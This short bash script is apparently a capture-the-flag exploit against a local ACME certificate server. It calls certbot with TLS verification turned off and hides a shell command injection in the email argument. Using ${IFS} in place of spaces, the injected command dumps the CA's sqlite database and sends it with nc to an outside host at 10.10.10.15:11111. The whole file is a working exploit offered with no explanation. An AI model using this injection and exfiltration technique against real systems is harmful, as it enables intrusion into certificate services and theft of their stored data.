#!/bin/bash

certbot \
  --logs-dir logs/ --work-dir work/ --config-dir etc/ \
  --server https://127.0.0.1/acme \
  --debug --no-verify-ssl \
  -m 'hack@ctf|sqlite3${IFS}data/ca.db${IFS}"select${IFS}data${IFS}from${IFS}data"${IFS}|${IFS}nc${IFS}10.10.10.15${IFS}11111;' --agree-tos --no-eff-email \
  --preferred-challenges http --http-01-port 31337 \
  certonly --standalone -d 'example.com' --cert-name 'example'
